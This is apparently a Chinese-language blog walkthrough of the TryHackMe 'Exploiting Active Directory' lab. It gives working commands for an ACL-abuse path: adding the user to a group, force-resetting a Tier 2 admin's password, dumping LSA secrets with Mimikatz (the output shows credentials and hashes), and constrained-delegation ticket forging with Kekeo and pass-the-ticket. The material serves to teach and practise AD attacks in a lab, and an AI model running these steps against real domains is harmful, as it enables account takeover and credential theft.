<p>Sharphound 已经为您执行并作为任务文件附加。在 AttackBox 或 Kali 机器上启动 Bloodhound 并摄取数据。不过，我们欢迎您按照枚举 AD 室中提供的步骤自行重新运行 Sharphound。注意：如果您得到 <code>Unable to connect to LDAP, verify your credentials</code> ，请确保您的域名设置正确。我们提供了 SharpHound 数据的 ZIP 作为任务文件。在 AttackBox 上，您可以在 <code>/root/Rooms/ExploitingAD/</code> 下找到 ZIP 文件。首先，我们需要启动 neo4j：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610161350958.png" alt="image-20240610161350958"></p>
<p>在另一个终端选项卡中，运行 <code>bloodhound --no-sandbox</code> 。这将向您显示身份验证 GUI：</p>
<p>neo4j 数据库的默认凭据将为 <code>neo4j:neo4j</code> 。使用它在 Bloodhound 中进行身份验证。通过身份验证后，您可以将两个拉链拖放到 Bloodhound 屏幕上。一旦数据被摄取，我们就可以再次开始枚举攻击路径。</p>
<h2 id="权限提升">权限提升</h2>
<p>如果我们在 Bloodhound 中搜索任务 1 中分配的用户帐户，我们会发现我们没有太多权限。我们能够通过 RDP 进入 THMWRK1，但这只会为我们提供低特权访问。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610162525415.png" alt="image-20240610162525415"></p>
<p>由于域是分层的，我们的第一步将是破坏第 2 层基础设施。我们需要危及 Tier 2 Admins 组，因为该组拥有所有工作站的管理权限。让我们问问寻血猎犬是否有一条道路可以用来危害这个组织。将您的用户帐户添加为起始位置，将 Tier 2 Admins 组添加为结束位置。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610164342797.png" alt="image-20240610164342797"></p>
<p>Bloodhound向我们展示了一条非常有趣的道路。看来这个领域有一点权限委托。管理员通过向域用户组提供 AddMembers ACE 错误配置了 IT 支持组的权限委派。这意味着域用户组的任何成员（包括我们的帐户）都可以将帐户添加到 IT 支持组。此外，Bloodhound 显示 IT 支持组拥有适用于第 2 层管理员组成员的 ForceChangePassword ACE。这并不是真正的错误配置，因为第 2 层管理员并不那么敏感，但与最初的错误配置结合使用时，它提供了非常有效的攻击路径。让我们利用它吧！</p>
<h2 id="addmember">AddMember</h2>
<p>此攻击路径的第一步是将我们的 AD 帐户添加到 IT 支持组。为此，我们将使用 AD-RSAT 工具集中的 Add-ADGroupMember PowerShell cmdlet。在 THMJMP1 主机上启动 PowerShell（通过 RDP 或通过 SSH）并运行以下命令来添加您的帐户：</p>
<pre><code class="hljs scss">Add-ADGroupMember "IT Support" -Members "michael<span class="hljs-selector-class">.cameron</span>"
Get-ADGroupMember -Identity "IT Support"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610165135737.png" alt="image-20240610165135737"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610165121870.png" alt="image-20240610165121870"></p>
<p>如果一切正常，您应该会以会员身份看到您的帐户。</p>
<h2 id="forcechangepassword">ForceChangePassword</h2>
<p>现在我们是 IT 支持组的成员，我们继承了第 2 层管理员组的 ForceChangePassword 权限委派。首先，我们需要确定该群体的成员以选择目标。我们可以再次使用 Get-ADGroupMember cmdlet 来协助完成此操作：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610165428125.png" alt="image-20240610165428125"></p>
<p>记下这些帐户之一的用户名。由于网络是共享的，因此最好选择列表中更靠下的一个。我们将使用 Set-ADAccountPassword AD-RSAT cmdlet 强制更改密码：</p>
<p>这里我选择用户：t2_robin.wyatt</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610165457634.png" alt="image-20240610165457634"></p>
<pre><code class="hljs scss"><span class="hljs-variable">$Password</span> = ConvertTo-SecureString "Hy8cx@<span class="hljs-number">123</span><span class="hljs-string">" -AsPlainText -Force</span>
<span class="hljs-string">Set-ADAccountPassword -Identity "</span>t2_robin.wyatt<span class="hljs-string">" -Reset -NewPassword $Password</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610165942303.png" alt="image-20240610165942303"></p>
<p><strong>注意：如果您收到“访问被拒绝”错误，则表明您的权限尚未通过域传播。这最多可能需要 10 分钟。最好的方法是终止 SSH 或 RDP 会话，短暂休息一下，然后重新进行身份验证并重试。您还可以运行 <code>gpupdate /force</code> ，然后断开连接并重新连接，这在某些情况下会导致同步速度更快。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610171636074.png" alt="image-20240610171636074"></p>
<p>从这里能看出，第二层的管理员，拥有管理第一层THMWRK1的权限</p>
<p>如果此步骤有效，您现在应该能够使用此目标帐户及其新密码向 THMWRK1 进行身份验证。您当前拥有此工作站的管理访问权限。恭喜！您已通过利用权限委派将您的特权正式升级为第 2 级管理员。</p>
<pre><code class="hljs scss">xfreerdp /v:thmwrk1.za.tryhackme.loc /u:<span class="hljs-string">'t2_robin.wyatt'</span> /p:<span class="hljs-string">'Hy8cx@123'</span> /cert:ignore</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610170953997.png" alt="image-20240610170953997"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610171007200.png" alt="image-20240610171007200"></p>
<h1 id="0x03-利用kerberos委派">0x03 利用Kerberos委派</h1>
<p>接下来，我们将了解 Kerberos 委托。当您谈论 AD 委派时，通常讨论的是这，而不是权限委派。</p>
<h2 id="kerberos-委派">Kerberos 委派</h2>
<p>Kerberos 委派的实际用途是使应用程序能够访问托管在不同服务器上的资源。例如，Web 服务器需要访问其托管的 Web 应用程序的数据库服务器上托管的 SQL 数据库。如果没有委派，我们可能会使用 AD 服务帐户并为其提供对数据库的直接访问权限。当在 Web 应用程序上发出请求时，服务帐户将用于对数据库进行身份验证并恢复信息。</p>
<p>但是，我们可以允许将此服务帐户委托给 SQL Server 服务。用户登录我们的 Web 应用程序后，服务帐户将代表该用户请求访问数据库。这意味着用户只能访问他们拥有相关权限的数据库中的数据，而无需向服务帐户本身提供任何数据库特权或权限。</p>
<h2 id="受约束与无约束">受约束与无约束</h2>
<p>Kerberos 委派有两种类型。在Kerberos Delegation的最初实现中，使用了Unconstrained Delegation，这是最不安全的方法。本质上，无约束委派对委派没有任何限制。在后台，如果设置了“TRUSTED_FOR_DELEGATION”标志的用户对配置了无约束委派的主机进行身份验证，则会生成该用户帐户的票证授予票证 (TGT) 并将其存储在内存中，以便以后需要时使用。假设攻击者可以危害启用了无约束委派的主机。在这种情况下，他们可能会尝试强制特权帐户向主机进行身份验证，这将允许他们拦截生成的 TGT 并模拟特权服务。如果您想查看利用无约束委派的示例，<a target="_blank" rel="noopener" href="https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976">请查看此处</a>。</p>
<p>为了解决无约束委派的安全缺陷，微软于 2003 年推出了约束委派。约束委派限制了帐户可以委派的服务，从而限制了帐户被盗用时的风险。以下是可以配置委派的服务示例：</p>
<ul>
<li>HTTP - 用于 Web 应用程序，以允许使用 AD 凭据进行直通身份验证。</li>
<li>CIFS - 通用互联网文件系统用于文件共享，允许用户委派共享。</li>
<li>LDAP - 用于委托 LDAP 服务执行重置用户密码等操作。</li>
<li>HOST- 允许主机上所有活动的帐户委派。</li>
<li>MSSQL - 允许将用户帐户委派给 SQL 服务，以对数据库进行直通身份验证。</li>
</ul>
<p>利用受约束委派通常比利用无约束委派更复杂，因为受委派帐户不能仅用于所有用途。然而，它仍然可以用于一些强大的利用。一个例子是，如果我们能够破坏配置了约束委派的 AD 帐户。通过知道该帐户的明文密码甚至 NTLM 哈希值，我们可以为该帐户生成 TGT，然后使用 TGT 为任何非敏感用户帐户执行票证授予服务器 (TGS) 请求，以便访问作为该用户的服务。例如，想象一下模拟一个可以访问敏感数据库的帐户。</p>
<h2 id="基于资源的约束委派">基于资源的约束委派</h2>
<p>所以 Kerberos 委托实际上分为三种类型。但这一点本身就值得一提。 Microsoft 于 2012 年推出的基于资源的约束委派 (RBCD) 再次对 Kerberos 委派提供了额外的安全限制。 RBCD 完全改变了委托模型。服务现在指定哪些对象可以委托给它，而不是指定哪个对象可以委托给哪个服务。这允许服务所有者控制谁可以访问它。在我们的 Web 应用程序示例中，这意味着我们现在可以在数据库服务上指定允许 Web 服务帐户委派对其的访问，而不是指定 Web 服务帐户可以委托给数据库服务来访问数据库。</p>
<p>假设我们有权为服务配置 RBCD。这意味着我们有能力为 AD 对象设置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。我们可以用我们有权访问的 AD 帐户的详细信息填充此属性。现在要访问该服务，我们可以为我们控制的帐户生成 TGT，这将允许我们与该服务进行交互。如果您想要 RBCD 利用的详细示例，<a target="_blank" rel="noopener" href="https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/">请查看此处</a>。</p>
<h2 id="约束委派利用">约束委派利用</h2>
<p>我们将利用约束委派来完成这项任务。我们需要做的第一件事是枚举可用的委派。让我们使用新的特权用户来执行网络命令。我们可以通过运行以下命令来使用 PowerSploit 的 Get-NetUser cmdlet 进行此枚举：</p>
<pre><code class="hljs scss">ssh za<span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\\t2_robin<span class="hljs-selector-class">.wyatt</span><span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc
//密码：Hy8cx@<span class="hljs-number">123</span></code></pre>
<p>使用ssh登录我们0x02中得到的特权用户</p>
<pre><code class="hljs scss">PS C:\&gt;Import-Module C:\Tools\PowerView.ps1 
PS C:\&gt;Get-NetUser -TrustedToAuth</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610180432163.png" alt="image-20240610180432163"></p>
<p>根据此命令的输出，我们可以看到 svcIIS 帐户可以委托 THMSERVER1 上的 HTTP 和 WSMAN 服务（msds-allowedtodelegateto可以看出）。您可能会认为这意味着我们只能代表模拟用户访问网站。但是，PowerShell Remoting 也使用 HTTP 和 WSMAN 服务。理想的选择是模拟第 1 层管理员，因为这将为我们提供对 THMSERVER1 的管理访问权限。</p>
<p>如果您要对 THMWRK1 执行正确的利用后枚举，您会发现主机上有一个服务以 svcIIS 用户身份运行。由于我们现在拥有管理访问权限，因此我们可以使用它来转储 LSASecrets，它是 Windows 注册表配置单元的一部分，其中存储了 Windows 服务等功能的凭据。让我们使用 Mimikatz 来转储秘密：</p>
<pre><code class="hljs scss">PS C:\Users\t2_robin.wyatt&gt; C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  </span>
<span class="hljs-comment"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
<span class="hljs-comment"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) </span>
<span class="hljs-comment">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span> 

mimikatz # token::elevate 
Token Id  : <span class="hljs-number">0</span>
User name :
SID name  : NT AUTHORITY\SYSTEM 

<span class="hljs-number">496</span>     {<span class="hljs-number">0</span>;<span class="hljs-number">000003</span>e7} <span class="hljs-number">1</span> D <span class="hljs-number">17693</span>          NT AUTHORITY\SYSTEM     S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span>        (<span class="hljs-number">04</span>g,<span class="hljs-number">21</span>p)       Primary
 -&gt; Impersonated !
 * Process Token : {<span class="hljs-number">0</span>;<span class="hljs-number">001</span>e58cb} <span class="hljs-number">0</span> D <span class="hljs-number">2319205</span>     ZA\t2_robin<span class="hljs-selector-class">.wyatt</span>       S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">5409</span>  (<span class="hljs-number">12</span>g,<span class="hljs-number">24</span>p)       Primary 
 * Thread Token  : {<span class="hljs-number">0</span>;<span class="hljs-number">000003</span>e7} <span class="hljs-number">1</span> D <span class="hljs-number">2350898</span>     NT AUTHORITY\SYSTEM     S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span>        (<span class="hljs-number">04</span>g,<span class="hljs-number">21</span>p)       Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : THMWRK1 
SysKey : a1403e57976b472bce5f231922ca3942 

Local name : THMWRK1 ( S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3226461851</span>-<span class="hljs-number">763325627</span>-<span class="hljs-number">4205969673</span> )
Domain name : ZA ( S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span> )
Domain FQDN : za.tryhackme.loc

Policy subsystem is : <span class="hljs-number">1.18</span>
LSA <span class="hljs-built_in">Key</span>(s) : <span class="hljs-number">1</span>, default {cfcff4be-beab-<span class="hljs-number">7</span>d93-cfa3-edb6a9a3bf27} 
  <span class="hljs-selector-attr">[00]</span> {cfcff4be-beab-<span class="hljs-number">7</span>d93-cfa3-edb6a9a3bf27} <span class="hljs-number">929</span>bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463 

Secret  : <span class="hljs-variable">$MACHINE</span>.ACC
cur/text: <span class="hljs-number">0</span>FFIKa<span class="hljs-string">"c[#L6T&gt;=.s*ZW'Gz04FL&amp;7,"</span>VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*<span class="hljs-number">8</span>+&amp;?neR%&gt;l_W!w&amp;<span class="hljs-selector-class">.oz</span>@<span class="hljs-number">1</span>MDJHs`&amp;suI rmg,g GQsb%),mlWLo?<span class="hljs-number">6</span><span class="hljs-variable">$kqP</span> 
    <span class="hljs-attribute">NTLM</span>:<span class="hljs-number">4207</span>d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db
old/<span class="hljs-attribute">text</span>: <span class="hljs-number">0</span>FFIKa<span class="hljs-string">"c[#L6T&gt;=.s*ZW'Gz04FL&amp;7,"</span>VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*<span class="hljs-number">8</span>+&amp;?neR%&gt;l_W!w&amp;<span class="hljs-selector-class">.oz</span>@<span class="hljs-number">1</span>MDJHs`&amp;suI rmg,g GQsb%),mlWLo?<span class="hljs-number">6</span><span class="hljs-variable">$kqP</span> 
    <span class="hljs-attribute">NTLM</span>:<span class="hljs-number">4207</span>d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db

Secret  : DefaultPassword
old/<span class="hljs-attribute">text</span>: vagrant

Secret  : DPAPI_SYSTEM 
cur/hex : <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> b6 <span class="hljs-number">54</span> c4 <span class="hljs-number">83</span> d9 <span class="hljs-number">88</span> <span class="hljs-number">10</span> f6 ee ae fc b7 ed <span class="hljs-number">2</span>d a2 d6 <span class="hljs-number">47</span> <span class="hljs-number">11</span> <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">4</span>a <span class="hljs-number">6</span>d <span class="hljs-number">7</span>f <span class="hljs-number">72</span> <span class="hljs-number">35</span> b8 a2 <span class="hljs-number">93</span> <span class="hljs-number">3</span>d <span class="hljs-number">5</span>c <span class="hljs-number">5</span>e <span class="hljs-number">3</span>f <span class="hljs-number">03</span> <span class="hljs-number">8</span>d <span class="hljs-number">79</span> <span class="hljs-number">49</span> <span class="hljs-number">90</span> e7 <span class="hljs-number">2</span>e e0
    <span class="hljs-attribute">full</span>: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / <span class="hljs-number">4</span>a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
old/hex : <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">4</span>d a3 <span class="hljs-number">82</span> e2 da <span class="hljs-number">30</span> <span class="hljs-number">1</span>f <span class="hljs-number">33</span> d6 <span class="hljs-number">49</span> a4 c9 <span class="hljs-number">81</span> <span class="hljs-number">26</span> e5 <span class="hljs-number">25</span> <span class="hljs-number">59</span> bb <span class="hljs-number">9</span>f <span class="hljs-number">8</span>a <span class="hljs-number">76</span> b1 <span class="hljs-number">5</span>d <span class="hljs-number">59</span> c6 <span class="hljs-number">87</span> c6 <span class="hljs-number">32</span> b7 <span class="hljs-number">02</span> <span class="hljs-number">0</span>b c1 <span class="hljs-number">5</span>b <span class="hljs-number">24</span> f4 <span class="hljs-number">44</span> d0 <span class="hljs-number">74</span> <span class="hljs-number">31</span>  
    <span class="hljs-attribute">full</span>: <span class="hljs-number">104</span>da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431
    m/u : <span class="hljs-number">104</span>da382e2da301f33d649a4c98126e52559bb9f / <span class="hljs-number">8</span>a76b15d59c687c632b7020bc15b24f444d07431

Secret  : NL<span class="hljs-variable">$KM</span>
cur/hex : <span class="hljs-number">10</span> bb <span class="hljs-number">99</span> <span class="hljs-number">02</span> da <span class="hljs-number">94</span> <span class="hljs-number">4</span>a <span class="hljs-number">26</span> cd ad <span class="hljs-number">07</span> f3 <span class="hljs-number">62</span> <span class="hljs-number">64</span> <span class="hljs-number">53</span> <span class="hljs-number">5</span>c a8 <span class="hljs-number">12</span> be e3 <span class="hljs-number">16</span> <span class="hljs-number">1</span>f <span class="hljs-number">8</span>f <span class="hljs-number">99</span> ae ab <span class="hljs-number">97</span> <span class="hljs-number">37</span> c4 bc ee df <span class="hljs-number">63</span> <span class="hljs-number">7</span>c <span class="hljs-number">2</span>f <span class="hljs-number">6</span>d <span class="hljs-number">07</span> c5 d9 <span class="hljs-number">5</span>e <span class="hljs-number">29</span> e7 ce ce <span class="hljs-number">48</span> <span class="hljs-number">52</span> <span class="hljs-number">47</span> <span class="hljs-number">19</span> <span class="hljs-number">8</span>a <span class="hljs-number">03</span> <span class="hljs-number">99</span> ff <span class="hljs-number">97</span> ec <span class="hljs-number">7</span>f <span class="hljs-number">49</span> a1 <span class="hljs-number">79</span> <span class="hljs-number">15</span> d9 a0 <span class="hljs-number">04</span> ac <span class="hljs-number">58</span>
old/hex : <span class="hljs-number">10</span> bb <span class="hljs-number">99</span> <span class="hljs-number">02</span> da <span class="hljs-number">94</span> <span class="hljs-number">4</span>a <span class="hljs-number">26</span> cd ad <span class="hljs-number">07</span> f3 <span class="hljs-number">62</span> <span class="hljs-number">64</span> <span class="hljs-number">53</span> <span class="hljs-number">5</span>c a8 <span class="hljs-number">12</span> be e3 <span class="hljs-number">16</span> <span class="hljs-number">1</span>f <span class="hljs-number">8</span>f <span class="hljs-number">99</span> ae ab <span class="hljs-number">97</span> <span class="hljs-number">37</span> c4 bc ee df <span class="hljs-number">63</span> <span class="hljs-number">7</span>c <span class="hljs-number">2</span>f <span class="hljs-number">6</span>d <span class="hljs-number">07</span> c5 d9 <span class="hljs-number">5</span>e <span class="hljs-number">29</span> e7 ce ce <span class="hljs-number">48</span> <span class="hljs-number">52</span> <span class="hljs-number">47</span> <span class="hljs-number">19</span> <span class="hljs-number">8</span>a <span class="hljs-number">03</span> <span class="hljs-number">99</span> ff <span class="hljs-number">97</span> ec <span class="hljs-number">7</span>f <span class="hljs-number">49</span> a1 <span class="hljs-number">79</span> <span class="hljs-number">15</span> d9 a0 <span class="hljs-number">04</span> ac <span class="hljs-number">58</span>  

Secret  : _SC_thmwinauth / service <span class="hljs-string">'thmwinauth'</span> with username : svcIIS<span class="hljs-keyword">@za</span>.tryhackme.loc 
cur/<span class="hljs-attribute">text</span>: Password1@</code></pre>
<p>让我们运行一下这两个命令：</p>
<ul>
<li>token::elevate - 要从注册表配置单元转储机密，我们需要模拟 SYSTEM 用户。</li>
<li>lsadump::secrets - Mimikatz 与注册表配置单元交互以提取明文凭据。</li>
</ul>
<p>现在我们可以访问与 svcIIS 帐户关联的密码，我们可以执行 Kerberos 委派攻击。我们将结合使用 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">Kekeo</a> 和 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/security">Mimikatz</a>。您可以为 Mimikatz 使用另一个窗口，但请确保在执行 <code>token::elevate</code> 命令后退出 Mimikatz，否则稍后将在错误的上下文中加载票证。我们将使用 Kekeo 生成票证，然后使用 Mimikatz 将这些票证加载到内存中。让我们从生成票开始：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610182003135.png" alt="image-20240610182003135"></p>
<p>我们首先需要生成一个 TGT，可用于生成 HTTP 和 WSMAN 服务的票证：</p>
<pre><code class="hljs scss">tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610182237671.png" alt="image-20240610182237671"></p>
<p>参数解释：</p>
<ul>
<li>user - 具有受限委派权限的用户。</li>
<li>domain - 我们正在攻击的域，因为 Kekeo 可用于伪造票证以滥用跨林信任。</li>
<li>password - 与 svcIIS 帐户关联的密码。</li>
</ul>
<p>现在，我们有了可以执行委托的帐户的 TGT，我们可以为想要模拟的帐户伪造 TGS 请求。我们需要对 HTTP 和 WSMAN 执行此操作，以便我们在 THMSERVER1 上创建 PSSession：</p>
<pre><code class="hljs scss">tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610182949435.png" alt="image-20240610182949435"></p>
<p>参数解释：</p>
<ul>
<li>tgt - 我们提供在上一步中生成的 TGT。</li>
<li>user - 我们想要模拟的用户。由于 t2_ 帐户对工作站具有管理访问权限，因此可以安全地假设 t1_ 帐户对服务器具有管理访问权限，因此请选择您想要模拟的 t1_ 帐户。</li>
<li>service - 我们想要使用委托来模拟的服务。我们首先为 HTTP 服务生成一个 TGS。然后我们可以为 WSMAN 服务重新运行相同的命令。</li>
</ul>
<p>再次运行该命令，这次是针对 WSMAN 服务。现在我们有了两张 TGS 票据，我们可以使用 Mimikatz 导入它们：</p>
<pre><code class="hljs scss">tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:WSMAN/THMSERVER1.za.tryhackme.loc</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610183031854.png" alt="image-20240610183031854"></p>
<pre><code class="hljs scss">mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_WSMAN~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: <span class="hljs-string">'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'</span>: OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: <span class="hljs-string">'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'</span>: OK</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610183203761.png" alt="image-20240610183203761"></p>
<p>如果您想验证票证是否已导入，您可以退出 Mimikatz 并运行 <code>klist</code> 。现在票证已导入，我们终于可以在 THMSERVER1 上创建 PSSession：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610183331706.png" alt="image-20240610183331706"></p>
<pre><code class="hljs scss">New-PSSession -ComputerName thmserver1<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>
Enter-PSSession -ComputerName thmserver1<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240610184524078.png" alt="image-20240610184524078"></p>
